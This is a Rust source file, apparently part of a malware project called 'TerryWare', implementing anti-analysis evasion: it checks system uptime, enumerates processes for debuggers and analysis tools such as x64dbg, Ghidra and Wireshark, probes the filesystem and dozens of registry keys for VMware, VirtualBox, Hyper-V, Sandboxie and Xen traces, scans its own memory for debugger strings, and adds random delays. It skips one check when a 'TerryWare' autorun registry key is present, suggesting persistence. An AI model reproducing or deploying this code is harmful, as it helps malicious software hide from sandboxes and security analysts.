use std::thread;
use std::env;
use winreg::RegKey;
use winreg::enums::HKEY_CURRENT_USER;
use winreg::enums::KEY_READ;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use winreg::enums::HKEY_LOCAL_MACHINE;
use rand::Rng;
use sysinfo::System;
use colored::*;
use winapi::um::sysinfoapi::{GetTickCount64, GetSystemInfo, SYSTEM_INFO};
use std::collections::HashSet;
use winapi::um::memoryapi::VirtualQuery;
use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT};

pub struct EvasionCheck;

impl EvasionCheck {
    pub fn check_environment() -> bool {
        println!("[+] Starting environment checks...");
        let mut suspicious_environment = false;

        // System Uptime Check
        println!("[+] Checking system uptime...");
        let skip_check = if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER)
            .open_subkey_with_flags(r"Software\Microsoft\Windows\CurrentVersion\Run", KEY_READ) {
            hkcu.get_value::<String, _>("TerryWare").is_ok()
        } else {
            false
        };

        if !skip_check {
            unsafe {
                let uptime_ms = GetTickCount64();
                let uptime_secs = uptime_ms / 1000;
                
                if uptime_secs < 120 {
                    println!("{} Suspicious uptime detected:\n    {} seconds", "[!]".red(), uptime_secs);
                    suspicious_environment = true;
                } else {
                    let days = uptime_secs / (24 * 60 * 60);
                    let hours = (uptime_secs % (24 * 60 * 60)) / (60 * 60);
                    let mins = (uptime_secs % (60 * 60)) / 60;
                    let secs = uptime_secs % 60;
                    println!("{} Uptime normal: {:02}d:{:02}h:{:02}m:{:02}s", "[+]".green(), days, hours, mins, secs);
                }
            }
        }

        // Process Check
        println!("[+] Checking for analysis tools...");
        match Self::check_analysis_processes() {
            (true, found) => {
                println!("{} Analysis tools detected:\n    {}", "[!]".red(), found);
                suspicious_environment = true;
            },
            (false, _) => println!("[+] No analysis tools found"),
        }

        // VM Artifacts
        println!("[+] Checking VM artifacts...");
        match Self::check_vm_artifacts() {
            (true, found) => {
                println!("{} VM artifacts detected: {}", "[!]".red(), found);
                suspicious_environment = true;
            },
            (false, _) => println!("{} No VM artifacts found", "[+]".green()),
        }

        // Registry Check
        println!("[+] Checking registry for VM traces...");
        match Self::check_vm_registry() {
            (true, found) => {
                println!("{} VM registry artifacts detected: {}", "[!]".red(), found);
                suspicious_environment = true;
            },
            (false, _) => println!("[+] No VM registry artifacts found"),
        }

        // Memory Patterns
        match Self::scan_memory_for_patterns() {
            (true, found) => {
                println!("{} Suspicious memory patterns found:{}", "[!]".red(), found);
                suspicious_environment = true;
            },
            (false, _) => println!("[+] No suspicious memory patterns found"),
        }

        println!("[+] Environment checks complete.");
        !suspicious_environment
    }

    fn check_analysis_processes() -> (bool, String) {
        println!("[+] Enumerating processes...");
        let mut sys = System::new_all();
        sys.refresh_all();
        
        let suspicious_patterns = [
            "windbg", "dbgeng", "dbgsrv",
            "x64dbg", "x32dbg",
            "dbgx.shell", "dbgx.host",
            "dbghost", "dbgshell",
            "ida64", "ida32", "idapro",
            "ollydbg", "immunity",
            "ghidra", "radare2",
            "dbghelp", "vsdbg",
            "debugger", "debugging",
            "wireshark", "tcpdump",
        ];
        
        let mut found_processes = Vec::new();
        
        for (pid, process) in sys.processes() {
            let process_name = process.name().to_string_lossy().to_ascii_lowercase();
            
            for pattern in &suspicious_patterns {
                if process_name.contains(pattern) {
                    found_processes.push(format!("{} (PID: {})", process_name, pid));
                    break;
                }
            }
            
            let cmd = process.cmd();
            for cmd_arg in cmd {
                let cmd_lower = cmd_arg.to_string_lossy().to_ascii_lowercase();
                if cmd_lower.contains("debugger") || 
                   cmd_lower.contains("-debug=") ||
                   cmd_lower.contains("--debug-") ||
                   cmd_lower.contains("-dbg=") ||
                   cmd_lower.contains("windbg") {
                    found_processes.push(format!("{} (debug cmdline)", process_name));
                    break;
                }
            }
        }

        if !found_processes.is_empty() {
            (true, found_processes.join(", "))
        } else {
            (false, String::new())
        }
    }

    fn check_vm_artifacts() -> (bool, String) {
        let suspicious_paths = [
            "C:\\Windows\\System32\\Vmms.exe",
            "C:\\Windows\\System32\\vm3dservice.exe",
            "/usr/bin/vmware",
            "/usr/bin/virtualbox"
        ];

        // Check suspicious paths
        for path in &suspicious_paths {
            if std::path::Path::new(path).exists() {
                return (true, format!("Found VM-related file:\n    {}", path));
            }
        }

        if let Ok(computername) = env::var("COMPUTERNAME") {
            let comp_lower = computername.to_lowercase();
            if comp_lower.contains("virtual") || comp_lower.contains("vm") {
                return (true, format!("Suspicious computer name:\n    {}", computername));
            }
        }

        (false, String::new())
    }

    fn check_vm_registry() -> (bool, String) {
        let registry_paths = [
            // General
            (HKEY_LOCAL_MACHINE, r"Software\Classes\Folder\shell\sandbox"),
            
            // Hyper-V
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Hyper-V"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\VirtualMachine"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmicheartbeat"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmicvss"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmicshutdown"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmicexchange"),
            
            // Sandboxie
            (HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SbieDrv"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Sandboxie"),
            
            // VirtualBox
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\VBOX__"),
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\FADT\VBOX__"),
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\RSDT\VBOX__"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxGuest"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxMouse"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxService"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxSF"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VBoxVideo"),
            
            // VirtualPC
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vpcbus"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vpc-s3"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vpcuhub"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\msvmmouf"),
            
            // VMware
            (HKEY_CURRENT_USER, r"SOFTWARE\VMware, Inc.\VMware Tools"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmdebug"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmmouse"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VMTools"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\VMMEMCTL"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmware"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmci"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\vmx86"),
            
            // Wine
            (HKEY_CURRENT_USER, r"SOFTWARE\Wine"),
            (HKEY_LOCAL_MACHINE, r"SOFTWARE\Wine"),
            
            // Xen
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\DSDT\xen"),
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\FADT\xen"),
            (HKEY_LOCAL_MACHINE, r"HARDWARE\ACPI\RSDT\xen"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xenevtchn"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xennet"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xennet6"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xensvc"),
            (HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\xenvdb"),
        ];
        let pci_vendors = [
            (r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_1AB8"), // Parallels
            (r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_80EE"), // VirtualBox
            (r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_5333"), // VirtualPC
            (r"SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD"), // VMware
        ];
        let vmware_devices = [
            r"SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_IDE_CD",
            r"SYSTEM\CurrentControlSet\Enum\IDE\CdRomNECVMWar_VMware_SATA_CD",
            r"SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_IDE_Hard_Drive",
            r"SYSTEM\CurrentControlSet\Enum\IDE\DiskVMware_Virtual_SATA_Hard_Drive",
        ];

        // Check regular registry paths
        for (hkey, path) in &registry_paths {
            if RegKey::predef(*hkey)
                .open_subkey_with_flags(path, KEY_READ)
                .is_ok()
            {
                return (true, format!("\n    Found VM registry key: {}", path));
            }
        }

        // Partial PCI Vendor Match
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        for vendor in &pci_vendors {
            if hklm.open_subkey_with_flags(vendor, KEY_READ).is_ok() {
                return (true, format!("\n    Found VM PCI vendor: {}", vendor));
            }
        }

        // Partial VMWare Match
        for device in &vmware_devices {
            if hklm.open_subkey_with_flags(device, KEY_READ).is_ok() {
                return (true, format!("\n    Found VMware device: {}", device));
            }
        }

        (false, String::new())
    }

    pub fn start_monitoring() -> (Arc<AtomicBool>, thread::JoinHandle<()>) {
        let is_running = Arc::new(AtomicBool::new(true));
        let monitor_running = is_running.clone();
        
        let handle = thread::spawn(move || {
            while monitor_running.load(Ordering::SeqCst) {
                if !monitor_running.load(Ordering::SeqCst) { break; }
                if Self::check_analysis_processes().0 {
                    println!("[!] Analysis tool detected!");
                }
                
                if !monitor_running.load(Ordering::SeqCst) { break; }
                if Self::check_vm_artifacts().0 {
                    println!("[!] VM environment detected!");
                }
                
                if !monitor_running.load(Ordering::SeqCst) { break; }
                if Self::check_vm_registry().0 {
                    println!("[!] VM registry artifacts detected!");
                }
                
                if !monitor_running.load(Ordering::SeqCst) { break; }
                thread::sleep(Duration::from_secs(1));
            }
        });
        
        (is_running, handle)
    }
    
    pub fn stop_monitoring(monitor: (Arc<AtomicBool>, thread::JoinHandle<()>)) -> bool {
        monitor.0.store(false, Ordering::SeqCst);
        
        match monitor.1.join() {
            Ok(_) => {
                println!("[+] Monitoring stopped.");
                true
            }
            Err(_) => {
                println!("{} Warning: Monitoring thread did not stop cleanly\n    Thread join failed", "[!]".red());
                false
            }
        }
    }

    /// Delay Function
    pub fn add_delays() {
        let mut rng = rand::rng();
        let delay = rng.random_range(100..=1000);
        thread::sleep(Duration::from_millis(delay));
    }

    fn scan_memory_for_patterns() -> (bool, String) {
        println!("[+] Starting memory analysis...");
        
        let patterns = [
            b"DEBUG_WATERMARK_1234".to_vec(),
            b"ANALYSIS_PATTERN_5678".to_vec(),
            b"DBG".to_vec(),
            b"DEBUG".to_vec(),
            b"TRACE".to_vec(),
            b"BREAKPOINT".to_vec(),
            b"IsDebuggerPresent".to_vec(),
            b"CheckRemoteDebuggerPresent".to_vec(),
            b"WinDbg".to_vec(),
            b"x64dbg".to_vec(),
            b"IDA".to_vec(),
            b"Immunity".to_vec(),
            b"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug".to_vec(),
            b"__REGISTER_CALLBACK__".to_vec(),
            b"JIT_DEBUG_INFO".to_vec(),
            b"VBOX".to_vec(),
            b"VMware".to_vec(),
            b"QEMU".to_vec(),
            b"dbghelp.dll".to_vec(),
            b"symsrv.dll".to_vec(),
            //b"ntdll.dll".to_vec(), - Calling ntdll.dll by itself isn't practical since it's used by the NT kernel, so we'll skip (for now)
            b"W\0i\0n\0D\0b\0g\0".to_vec(),  // "WinDbg" in UTF-16LE
            b"D\0E\0B\0U\0G\0".to_vec(),     // "DEBUG" in UTF-16LE
            b"dbgeng.dll".to_vec(),
            b"dbgcore.dll".to_vec(),
            b"wow64cpu.dll".to_vec(),
            b"wow64win.dll".to_vec(),
            b"wow64.dll".to_vec(),
            b"WinDbgFrameClass".to_vec(),
            //b"ID".to_vec(), - Window class for IDA, but it's triggering false positives so we'll comment it out for now
            b"OLLYDBG".to_vec(),
            b"SeDebugPrivilege".to_vec(),
            b"CreateProcessA".to_vec(),
            b"CreateProcessW".to_vec(),
            b"DebugActiveProcess".to_vec(),
        ];

        let mut found = HashSet::new();
        let mut mem_info: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        
        let mut sys_info: SYSTEM_INFO = unsafe { std::mem::zeroed() };
        unsafe { GetSystemInfo(&mut sys_info) };
        
        println!("[+] Memory range: 0x{:X} - 0x{:X}", 
            sys_info.lpMinimumApplicationAddress as usize,
            sys_info.lpMaximumApplicationAddress as usize);

        let mut current_addr = sys_info.lpMinimumApplicationAddress as usize;
        
        while current_addr < sys_info.lpMaximumApplicationAddress as usize {
            let query_result = unsafe {
                VirtualQuery(
                    current_addr as *mut _,
                    &mut mem_info,
                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>()
                )
            };

            if query_result == 0 { break; }

            if mem_info.State as u32 == MEM_COMMIT {
                if let Some(buffer) = Self::read_memory_safely(current_addr as *const u8, 4096) {
                    for pattern in &patterns {
                        if buffer.windows(pattern.len()).any(|window| window == pattern) {
                            found.insert(format!("Found pattern '{}' at address: 0x{:X}", 
                                String::from_utf8_lossy(pattern),
                                current_addr
                            ));
                        }
                    }
                }
            }

            current_addr += mem_info.RegionSize;
        }

        if !found.is_empty() {
            (true, format!("\n    {}", found.into_iter().collect::<Vec<_>>().join("\n    ")))
        } else {
            (false, String::new())
        }
    }

    fn read_memory_safely(addr: *const u8, size: usize) -> Option<Vec<u8>> {
        let mut buffer = vec![0u8; size];
        unsafe {
            if winapi::um::memoryapi::ReadProcessMemory(
                winapi::um::processthreadsapi::GetCurrentProcess(),
                addr as *const _,
                buffer.as_mut_ptr() as *mut _,
                size,
                std::ptr::null_mut(),
            ) != 0 {
                Some(buffer)
            } else {
                None
            }
        }
    }
}

pub fn run_evasion_checks() -> bool {

    EvasionCheck::add_delays();
    let result = EvasionCheck::check_environment();

    result
} 